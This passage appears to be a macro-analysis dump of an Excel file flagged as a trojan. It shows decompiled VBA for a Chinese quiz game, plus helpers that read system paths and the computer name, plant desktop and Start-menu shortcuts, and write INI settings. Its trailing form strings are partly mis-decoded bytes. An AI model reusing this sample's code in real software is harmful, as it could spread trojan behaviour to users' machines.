' 	LitDI2 0x0020 
' 	ArgsSt Ans 0x0001 
' Line #390:
' Line #391:
' 	LitStr 0x0018 "我國大法官會議的主席是？"
' 	LitDI2 0x0021 
' 	ArgsSt Q 0x0001 
' Line #392:
' 	LitStr 0x000A "首席大法官"
' 	LitDI2 0x0021 
' 	ArgsSt Opt1 0x0001 
' Line #393:
' 	LitStr 0x000C "總統府秘書長"
' 	LitDI2 0x0021 
' 	ArgsSt Opt2 0x0001 
' Line #394:
' 	LitStr 0x0008 "司法院長"
' 	LitDI2 0x0021 
' 	ArgsSt Opt3 0x0001 
' Line #395:
' 	LitDI2 0x0003 
' 	LitDI2 0x0021 
' 	ArgsSt Ans 0x0001 
' Line #396:
' Line #397:
' 	LitStr 0x001C "我國國土面積是多少平方公里？"
' 	LitDI2 0x0022 
' 	ArgsSt Q 0x0001 
' Line #398:
' 	LitStr 0x0010 "一千一百四十二萬"
' 	LitDI2 0x0022 
' 	ArgsSt Opt1 0x0001 
' Line #399:
' 	LitStr 0x0010 "二千兩百四十二萬"
' 	LitDI2 0x0022 
' 	ArgsSt Opt2 0x0001 
' Line #400:
' 	LitStr 0x0010 "三千三百四十二萬"
' 	LitDI2 0x0022 
' 	ArgsSt Opt3 0x0001 
' Line #401:
' 	LitDI2 0x0001 
' 	LitDI2 0x0022 
' 	ArgsSt Ans 0x0001 
' Line #402:
' Line #403:
' 	LitStr 0x001C "台灣本島面積是多少平方公里？"
' 	LitDI2 0x0023 
' 	ArgsSt Q 0x0001 
' Line #404:
' 	LitStr 0x000E "一千九百四十多"
' 	LitDI2 0x0023 
' 	ArgsSt Opt1 0x0001 
' Line #405:
' 	LitStr 0x000E "二千七百六十多"
' 	LitDI2 0x0023 
' 	ArgsSt Opt2 0x0001 
' Line #406:
' 	LitStr 0x000E "三千五百七十多"
' 	LitDI2 0x0023 
' 	ArgsSt Opt3 0x0001 
' Line #407:
' 	LitDI2 0x0001 
' 	LitDI2 0x0023 
' 	ArgsSt Ans 0x0001 
' Line #408:
' Line #409:
' 	LitStr 0x0014 "台灣本島最大平原是？"
' 	LitDI2 0x0024 
' 	ArgsSt Q 0x0001 
' Line #410:
' 	LitStr 0x0008 "嘉南平原"
' 	LitDI2 0x0024 
' 	ArgsSt Opt1 0x0001 
' Line #411:
' 	LitStr 0x0008 "花東平原"
' 	LitDI2 0x0024 
' 	ArgsSt Opt2 0x0001 
' Line #412:
' 	LitStr 0x0008 "宜蘭平原"
' 	LitDI2 0x0024 
' 	ArgsSt Opt3 0x0001 
' Line #413:
' 	LitDI2 0x0001 
' 	LitDI2 0x0024 
' 	ArgsSt Ans 0x0001 
' Line #414:
' Line #415:
' 	LitStr 0x0030 "以我國版圖整體位置而言，位於幾何中心的地理區是？"
' 	LitDI2 0x0025 
' 	ArgsSt Q 0x0001 
' Line #416:
' 	LitStr 0x0008 "兩湖盆地"
' 	LitDI2 0x0025 
' 	ArgsSt Opt1 0x0001 
' Line #417:
' 	LitStr 0x0008 "河西走廊"
' 	LitDI2 0x0025 
' 	ArgsSt Opt2 0x0001 
' Line #418:
' 	LitStr 0x0008 "隴西高原"
' 	LitDI2 0x0025 
' 	ArgsSt Opt3 0x0001 
' Line #419:
' 	LitDI2 0x0003 
' 	LitDI2 0x0025 
' 	ArgsSt Ans 0x0001 
' Line #420:
' Line #421:
' 	LitStr 0x0016 "位於長白山地的天池是？"
' 	LitDI2 0x0026 
' 	ArgsSt Q 0x0001 
' Line #422:
' 	LitStr 0x0006 "火口湖"
' 	LitDI2 0x0026 
' 	ArgsSt Opt1 0x0001 
' Line #423:
' 	LitStr 0x0006 "偃塞湖"
' 	LitDI2 0x0026 
' 	ArgsSt Opt2 0x0001 
' Line #424:
' 	LitStr 0x0006 "斷層湖"
' 	LitDI2 0x0026 
' 	ArgsSt Opt3 0x0001 
' Line #425:
' 	LitDI2 0x0001 
' 	LitDI2 0x0026 
' 	ArgsSt Ans 0x0001 
' Line #426:
' Line #427:
' 	LitStr 0x0014 "有塞上江南之稱的是？"
' 	LitDI2 0x0027 
' 	ArgsSt Q 0x0001 
' Line #428:
' 	LitStr 0x0008 "嘉南平原"
' 	LitDI2 0x0027 
' 	ArgsSt Opt1 0x0001 
' Line #429:
' 	LitStr 0x0004 "河套"
' 	LitDI2 0x0027 
' 	ArgsSt Opt2 0x0001 
' Line #430:
' 	LitStr 0x000A "四川都江堰"
' 	LitDI2 0x0027 
' 	ArgsSt Opt3 0x0001 
' Line #431:
' 	LitDI2 0x0002 
' 	LitDI2 0x0027 
' 	ArgsSt Ans 0x0001 
' Line #432:
' Line #433:
' 	LitStr 0x0034 "Visual Basic 5.0中，命令按鈕物件不具有以下何種屬性？"
' 	LitDI2 0x0028 
' 	ArgsSt Q 0x0001 
' Line #434:
' 	LitStr 0x0007 "Caption"
' 	LitDI2 0x0028 
' 	ArgsSt Opt1 0x0001 
' Line #435:
' 	LitStr 0x0004 "Path"
' 	LitDI2 0x0028 
' 	ArgsSt Opt2 0x0001 
' Line #436:
' 	LitStr 0x0009 "MouseIcon"
' 	LitDI2 0x0028 
' 	ArgsSt Opt3 0x0001 
' Line #437:
' 	LitDI2 0x0002 
' 	LitDI2 0x0028 
' 	ArgsSt Ans 0x0001 
' Line #438:
' Line #439:
' 	LitStr 0x0030 "Visual Basic 5.0中，表格物件不具有以下何種屬性？"
' 	LitDI2 0x0029 
' 	ArgsSt Q 0x0001 
' Line #440:
' 	LitStr 0x0007 "Visible"
' 	LitDI2 0x0029 
' 	ArgsSt Opt1 0x0001 
' Line #441:
' 	LitStr 0x0007 "Enabled"
' 	LitDI2 0x0029 
' 	ArgsSt Opt2 0x0001 
' Line #442:
' 	LitStr 0x0005 "Value"
' 	LitDI2 0x0029 
' 	ArgsSt Opt3 0x0001 
' Line #443:
' 	LitDI2 0x0003 
' 	LitDI2 0x0029 
' 	ArgsSt Ans 0x0001 
' Line #444:
' Line #445:
' 	LitStr 0x0026 "下列何者不是網際網路提供的功能或服務？"
' 	LitDI2 0x002A 
' 	ArgsSt Q 0x0001 
' Line #446:
' 	LitStr 0x0010 "世界地理資訊系統"
' 	LitDI2 0x002A 
' 	ArgsSt Opt1 0x0001 
' Line #447:
' 	LitStr 0x000C "檔案查詢系統"
' 	LitDI2 0x002A 
' 	ArgsSt Opt2 0x0001 
' Line #448:
' 	LitStr 0x000E "電子佈告欄系統"
' 	LitDI2 0x002A 
' 	ArgsSt Opt3 0x0001 
' Line #449:
' 	LitDI2 0x0001 
' 	LitDI2 0x002A 
' 	ArgsSt Ans 0x0001 
' Line #450:
' Line #451:
' 	LitStr 0x0012 "網際網路的英文是？"
' 	LitDI2 0x002B 
' 	ArgsSt Q 0x0001 
' Line #452:
' 	LitStr 0x000E "World Wide Web"
' 	LitDI2 0x002B 
' 	ArgsSt Opt1 0x0001 
' Line #453:
' 	LitStr 0x0008 "Intranet"
' 	LitDI2 0x002B 
' 	ArgsSt Opt2 0x0001 
' Line #454:
' 	LitStr 0x0008 "Internet"
' 	LitDI2 0x002B 
' 	ArgsSt Opt3 0x0001 
' Line #455:
' 	LitDI2 0x0003 
' 	LitDI2 0x002B 
' 	ArgsSt Ans 0x0001 
' Line #456:
' Line #457:
' 	LitStr 0x0012 "網際網路的英文是？"
' 	LitDI2 0x002C 
' 	ArgsSt Q 0x0001 
' Line #458:
' 	LitStr 0x000E "World Wide Web"
' 	LitDI2 0x002C 
' 	ArgsSt Opt1 0x0001 
' Line #459:
' 	LitStr 0x0008 "Intranet"
' 	LitDI2 0x002C 
' 	ArgsSt Opt2 0x0001 
' Line #460:
' 	LitStr 0x0008 "Internet"
' 	LitDI2 0x002C 
' 	ArgsSt Opt3 0x0001 
' Line #461:
' 	LitDI2 0x0003 
' 	LitDI2 0x002C 
' 	ArgsSt Ans 0x0001 
' Line #462:
' Line #463:
' 	LitStr 0x0016 "網際資訊網路的英文是？"
' 	LitDI2 0x002D 
' 	ArgsSt Q 0x0001 
' Line #464:
' 	LitStr 0x0008 "Internet"
' 	LitDI2 0x002D 
' 	ArgsSt Opt1 0x0001 
' Line #465:
' 	LitStr 0x0005 "Hinet"
' 	LitDI2 0x002D 
' 	ArgsSt Opt2 0x0001 
' Line #466:
' 	LitStr 0x0007 "Network"
' 	LitDI2 0x002D 
' 	ArgsSt Opt3 0x0001 
' Line #467:
' 	LitDI2 0x0002 
' 	LitDI2 0x002D 
' 	ArgsSt Ans 0x0001 
' Line #468:
' Line #469:
' 	LitStr 0x0014 "全球資訊網的英文是？"
' 	LitDI2 0x002E 
' 	ArgsSt Q 0x0001 
' Line #470:
' 	LitStr 0x0003 "FTP"
' 	LitDI2 0x002E 
' 	ArgsSt Opt1 0x0001 
' Line #471:
' 	LitStr 0x0003 "WWW"
' 	LitDI2 0x002E 
' 	ArgsSt Opt2 0x0001 
' Line #472:
' 	LitStr 0x0003 "BBS"
' 	LitDI2 0x002E 
' 	ArgsSt Opt3 0x0001 
' Line #473:
' 	LitDI2 0x0002 
' 	LitDI2 0x002E 
' 	ArgsSt Ans 0x0001 
' Line #474:
' Line #475:
' 	LitStr 0x0014 "屬於資策會的網路是？"
' 	LitDI2 0x002F 
' 	ArgsSt Q 0x0001 
' Line #476:
' 	LitStr 0x0005 "Hinet"
' 	LitDI2 0x002F 
' 	ArgsSt Opt1 0x0001 
' Line #477:
' 	LitStr 0x0007 "Seednet"
' 	LitDI2 0x002F 
' 	ArgsSt Opt2 0x0001 
' Line #478:
' 	LitStr 0x0005 "TANet"
' 	LitDI2 0x002F 
' 	ArgsSt Opt3 0x0001 
' Line #479:
' 	LitDI2 0x0002 
' 	LitDI2 0x002F 
' 	ArgsSt Ans 0x0001 
' Line #480:
' Line #481:
' 	LitStr 0x0016 "台灣學術網路的英文是？"
' 	LitDI2 0x0030 
' 	ArgsSt Q 0x0001 
' Line #482:
' 	LitStr 0x0007 "Seednet"
' 	LitDI2 0x0030 
' 	ArgsSt Opt1 0x0001 
' Line #483:
' 	LitStr 0x0005 "Hinet"
' 	LitDI2 0x0030 
' 	ArgsSt Opt2 0x0001 
' Line #484:
' 	LitStr 0x0005 "TANet"
' 	LitDI2 0x0030 
' 	ArgsSt Opt3 0x0001 
' Line #485:
' 	LitDI2 0x0003 
' 	LitDI2 0x0030 
' 	ArgsSt Ans 0x0001 
' Line #486:
' Line #487:
' 	LitStr 0x0016 "１２８的４次方是多少？"
' 	LitDI2 0x0031 
' 	ArgsSt Q 0x0001 
' Line #488:
' 	LitStr 0x0009 "268435456"
' 	LitDI2 0x0031 
' 	ArgsSt Opt1 0x0001 
' Line #489:
' 	LitStr 0x0009 "288423456"
' 	LitDI2 0x0031 
' 	ArgsSt Opt2 0x0001 
' Line #490:
' 	LitStr 0x0009 "208435446"
' 	LitDI2 0x0031 
' 	ArgsSt Opt3 0x0001 
' Line #491:
' 	LitDI2 0x0001 
' 	LitDI2 0x0031 
' 	ArgsSt Ans 0x0001 
' Line #492:
' Line #493:
' 	LitStr 0x001E "有詩聖之稱的中國歷史名人是誰？"
' 	LitDI2 0x0032 
' 	ArgsSt Q 0x0001 
' Line #494:
' 	LitStr 0x0004 "杜甫"
' 	LitDI2 0x0032 
' 	ArgsSt Opt1 0x0001 
' Line #495:
' 	LitStr 0x0004 "杜牧"
' 	LitDI2 0x0032 
' 	ArgsSt Opt2 0x0001 
' Line #496:
' 	LitStr 0x0004 "李白"
' 	LitDI2 0x0032 
' 	ArgsSt Opt3 0x0001 
' Line #497:
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	ArgsSt Ans 0x0001 
' Line #498:
' Line #499:
' 	LitStr 0x0024 "以下何者不是布袋戲霹靂系列中的人物？"
' 	LitDI2 0x0033 
' 	ArgsSt Q 0x0001 
' Line #500:
' 	LitStr 0x0006 "秦假仙"
' 	LitDI2 0x0033 
' 	ArgsSt Opt1 0x0001 
' Line #501:
' 	LitStr 0x0006 "香九齡"
' 	LitDI2 0x0033 
' 	ArgsSt Opt2 0x0001 
' Line #502:
' 	LitStr 0x0006 "素還貞"
' 	LitDI2 0x0033 
' 	ArgsSt Opt3 0x0001 
' Line #503:
' 	LitDI2 0x0002 
' 	LitDI2 0x0033 
' 	ArgsSt Ans 0x0001 
' Line #504:
' Line #505:
' 	LitStr 0x0024 "以下何者不是布袋戲天宇系列中的人物？"
' 	LitDI2 0x0034 
' 	ArgsSt Q 0x0001 
' Line #506:
' 	LitStr 0x0004 "羅雀"
' 	LitDI2 0x0034 
' 	ArgsSt Opt1 0x0001 
' Line #507:
' 	LitStr 0x0006 "香九齡"
' 	LitDI2 0x0034 
' 	ArgsSt Opt2 0x0001 
' Line #508:
' 	LitStr 0x0006 "鬼王棺"
' 	LitDI2 0x0034 
' 	ArgsSt Opt3 0x0001 
' Line #509:
' 	LitDI2 0x0003 
' 	LitDI2 0x0034 
' 	ArgsSt Ans 0x0001 
' Line #510:
' Line #511:
' 	LitStr 0x002B "以下何者不是Excel能開啟之檔案的常見副檔名？"
' 	LitDI2 0x0035 
' 	ArgsSt Q 0x0001 
' Line #512:
' 	LitStr 0x0003 "XLA"
' 	LitDI2 0x0035 
' 	ArgsSt Opt1 0x0001 
' Line #513:
' 	LitStr 0x0003 "XLS"
' 	LitDI2 0x0035 
' 	ArgsSt Opt2 0x0001 
' Line #514:
' 	LitStr 0x0003 "DOT"
' 	LitDI2 0x0035 
' 	ArgsSt Opt3 0x0001 
' Line #515:
' 	LitDI2 0x0003 
' 	LitDI2 0x0035 
' 	ArgsSt Ans 0x0001 
' Line #516:
' Line #517:
' 	LitStr 0x002B "以下何者不是Excel能開啟之檔案的常見副檔名？"
' 	LitDI2 0x0036 
' 	ArgsSt Q 0x0001 
' Line #518:
' 	LitStr 0x0003 "XLB"
' 	LitDI2 0x0036 
' 	ArgsSt Opt1 0x0001 
' Line #519:
' 	LitStr 0x0003 "XLC"
' 	LitDI2 0x0036 
' 	ArgsSt Opt2 0x0001 
' Line #520:
' 	LitStr 0x0003 "XLM"
' 	LitDI2 0x0036 
' 	ArgsSt Opt3 0x0001 
' Line #521:
' 	LitDI2 0x0002 
' 	LitDI2 0x0036 
' 	ArgsSt Ans 0x0001 
' Line #522:
' Line #523:
' 	LitStr 0x0032 "WIndows 95內的附屬遊戲程式新接龍之檔案的名稱為何？"
' 	LitDI2 0x0037 
' 	ArgsSt Q 0x0001 
' Line #524:
' 	LitStr 0x000B "Msheart.exe"
' 	LitDI2 0x0037 
' 	ArgsSt Opt1 0x0001 
' Line #525:
' 	LitStr 0x000C "Freecell.exe"
' 	LitDI2 0x0037 
' 	ArgsSt Opt2 0x0001 
' Line #526:
' 	LitStr 0x0007 "Sol.exe"
' 	LitDI2 0x0037 
' 	ArgsSt Opt3 0x0001 
' Line #527:
' 	LitDI2 0x0002 
' 	LitDI2 0x0037 
' 	ArgsSt Ans 0x0001 
' Line #528:
' Line #529:
' 	LitStr 0x0030 "WIndows 95內的附屬遊戲程式接龍之檔案的名稱為何？"
' 	LitDI2 0x0038 
' 	ArgsSt Q 0x0001 
' Line #530:
' 	LitStr 0x000B "Msheart.exe"
' 	LitDI2 0x0038 
' 	ArgsSt Opt1 0x0001 
' Line #531:
' 	LitStr 0x000C "Freecell.exe"
' 	LitDI2 0x0038 
' 	ArgsSt Opt2 0x0001 
' Line #532:
' 	LitStr 0x0007 "Sol.exe"
' 	LitDI2 0x0038 
' 	ArgsSt Opt3 0x0001 
' Line #533:
' 	LitDI2 0x0003 
' 	LitDI2 0x0038 
' 	ArgsSt Ans 0x0001 
' Line #534:
' Line #535:
' 	LitStr 0x0030 "以下哪一個檔案不是WIndows 95絕對必要內的開機檔？"
' 	LitDI2 0x0039 
' 	ArgsSt Q 0x0001 
' Line #536:
' 	LitStr 0x000A "Emm386.exe"
' 	LitDI2 0x0039 
' 	ArgsSt Opt1 0x0001 
' Line #537:
' 	LitStr 0x0009 "Msdos.sys"
' 	LitDI2 0x0039 
' 	ArgsSt Opt2 0x0001 
' Line #538:
' 	LitStr 0x000B "Command.com"
' 	LitDI2 0x0039 
' 	ArgsSt Opt3 0x0001 
' Line #539:
' 	LitDI2 0x0001 
' 	LitDI2 0x0039 
' 	ArgsSt Ans 0x0001 
' Line #540:
' Line #541:
' 	LitStr 0x0030 "以下哪一個檔案不是WIndows 95絕對必要內的開機檔？"
' 	LitDI2 0x003A 
' 	ArgsSt Q 0x0001 
' Line #542:
' 	LitStr 0x0006 "Io.sys"
' 	LitDI2 0x003A 
' 	ArgsSt Opt1 0x0001 
' Line #543:
' 	LitStr 0x0009 "Msdos.sys"
' 	LitDI2 0x003A 
' 	ArgsSt Opt2 0x0001 
' Line #544:
' 	LitStr 0x000A "Config.sys"
' 	LitDI2 0x003A 
' 	ArgsSt Opt3 0x0001 
' Line #545:
' 	LitDI2 0x0003 
' 	LitDI2 0x003A 
' 	ArgsSt Ans 0x0001 
' Line #546:
' Line #547:
' 	LitStr 0x0022 "以下哪一個不是圖形檔常見的副檔名？"
' 	LitDI2 0x003B 
' 	ArgsSt Q 0x0001 
' Line #548:
' 	LitStr 0x0003 "WK1"
' 	LitDI2 0x003B 
' 	ArgsSt Opt1 0x0001 
' Line #549:
' 	LitStr 0x0003 "JPG"
' 	LitDI2 0x003B 
' 	ArgsSt Opt2 0x0001 
' Line #550:
' 	LitStr 0x0003 "PCX"
' 	LitDI2 0x003B 
' 	ArgsSt Opt3 0x0001 
' Line #551:
' 	LitDI2 0x0001 
' 	LitDI2 0x003B 
' 	ArgsSt Ans 0x0001 
' Line #552:
' Line #553:
' 	LitStr 0x0022 "以下哪一個不是圖形檔常見的副檔名？"
' 	LitDI2 0x003C 
' 	ArgsSt Q 0x0001 
' Line #554:
' 	LitStr 0x0003 "DOC"
' 	LitDI2 0x003C 
' 	ArgsSt Opt1 0x0001 
' Line #555:
' 	LitStr 0x0003 "GIF"
' 	LitDI2 0x003C 
' 	ArgsSt Opt2 0x0001 
' Line #556:
' 	LitStr 0x0003 "BMP"
' 	LitDI2 0x003C 
' 	ArgsSt Opt3 0x0001 
' Line #557:
' 	LitDI2 0x0001 
' 	LitDI2 0x003C 
' 	ArgsSt Ans 0x0001 
' Line #558:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/X - 6034 bytes
' Line #0:
' 	FuncDefn (Public Function SystemPath(id_FFFE As String) As String)
' Line #1:
' 	Dim 
' 	LitDI2 0x00FF 
' 	VarDefn B
' Line #2:
' 	LitDI2 0x00FF 
' 	ArgsLd Space$ 0x0001 
' 	St B 
' Line #3:
' 	Ld B 
' 	LitDI2 0x00FF 
' 	ArgsLd GetSystemDirectory 0x0002 
' 	St L 
' Line #4:
' 	Ld B 
' 	Ld L 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St SystemPath 
' Line #5:
' 	EndFunc 
' Line #6:
' 	FuncDefn (Public Function GetComputerName(id_FFFE As Variant))
' Line #7:
' 	Dim 
' 	LitDI2 0x00FF 
' 	VarDefn B
' Line #8:
' 	LitDI2 0x00FF 
' 	ArgsLd Space$ 0x0001 
' 	St B 
' Line #9:
' 	Ld B 
' 	LitDI2 0x00FF 
' 	ArgsLd GetComputerName 0x0002 
' 	St L 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld B 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	St L 
' Line #11:
' 	Ld B 
' 	Ld L 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St B 
' Line #12:
' 	Ld B 
' 	ArgsLd Trim 0x0001 
' 	St m_ComputerName 
' Line #13:
' 	Ld m_ComputerName 
' 	St ComputerName 
' Line #14:
' 	EndFunc 
' Line #15:
' 	FuncDefn (Public Function WinPath(id_FFFE As String) As String)
' Line #16:
' 	Dim 
' 	LitDI2 0x00FF 
' 	VarDefn B
' Line #17:
' 	LitDI2 0x00FF 
' 	ArgsLd Space$ 0x0001 
' 	St B 
' Line #18:
' 	Ld B 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St L 
' Line #19:
' 	Ld B 
' 	Ld L 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St WinPath 
' Line #20:
' 	EndFunc 
' Line #21:
' 	FuncDefn (Public Function GetRandomNumber(Mini As Single, Maxi As Single, id_FFFE As Single) As Single)
' Line #22:
' 	Ld Mini 
' 	Ld Maxi 
' 	Ge 
' 	IfBlock 
' Line #23:
' 	Ld Mini 
' 	LitStr 0x0008 " 必須比 "
' 	Concat 
' 	Ld Maxi 
' 	Concat 
' 	LitStr 0x0005 " 大！"
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #24:
' 	LitDI2 0x0000 
' 	St GetRandomNumber 
' Line #25:
' 	ExitFunc 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #28:
' 	Ld Maxi 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Ld Mini 
' 	Add 
' 	FnInt 
' 	St GetRandomNumber 
' Line #29:
' 	EndFunc 
' Line #30:
' 	FuncDefn (Public Sub CreateLink(位置 As Integer, 捷徑名稱 As String, 檔案路徑 As String, 程式參數 As String))
' Line #31:
' 	Ld vbHourglass 
' 	Ld Screen 
' 	MemSt MousePointer 
' Line #32:
' 	Ld 位置 
' 	SelectCase 
' Line #33:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0017 0x0004 "桌面"
' Line #34:
' 	LitStr 0x000D "..\..\Desktop"
' 	Ld 捷徑名稱 
' 	Ld 檔案路徑 
' 	Ld 程式參數 
' 	ArgsLd fCreateShellLink 0x0004 
' 	St Ret 
' Line #35:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0017 0x000A "開始功能表"
' Line #36:
' 	LitStr 0x0002 ".."
' 	Ld 捷徑名稱 
' 	Ld 檔案路徑 
' 	Ld 程式參數 
' 	ArgsLd fCreateShellLink 0x0004 
' 	St Ret 
' Line #37:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0017 0x0006 "程式集"
' Line #38:
' 	LitStr 0x0001 "."
' 	Ld 捷徑名稱 
' 	Ld 檔案路徑 
' 	Ld 程式參數 
' 	ArgsLd fCreateShellLink 0x0004 
' 	St Ret 
' Line #39:
' 	EndSelect 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld Screen 
' 	MemSt MousePointer 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String))
' Line #43:
' 	Ld Section 
' 	Ld KeyName 
' 	Ld Setting 
' 	Ld File 
' 	ArgsLd WritePrivateProfileString 0x0004 
' 	St h 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Public Function GetSettings(AppName As String, Key As String, File As String, id_FFFE As String) As String)
' Line #46:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St R$ 
' Line #47:
' 	Ld AppName 
' 	Ld Key 
' 	LitStr 0x0000 ""
' 	Ld R$ 
' 	Ld R$ 
' 	FnLen 
' 	Ld File 
' 	ArgsLd GetPrivateProfileString 0x0006 
' 	St X 
' Line #48:
' 	Ld R$ 
' 	Ld R$ 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St R$ 
' Line #49:
' 	Ld R$ 
' 	St GetSettings 
' Line #50:
' 	EndFunc 
' _VBA_PROJECT_CUR/VBA/Sheet2 - 1269 bytes
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ө���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ө���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�S	g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N!k_j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\-Nv��_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�f��`�vK�#l'T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ө���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���YE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���?��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T{\xe�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�[ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��iRL�xe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�L� 
ERROR: Unsupported stored type in user form: 32768
-------------------------------------------------------------------------------
VBA FORM Variable "b'Tar3'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Tar2'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Tar1'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdStart'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Arrow'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Game'
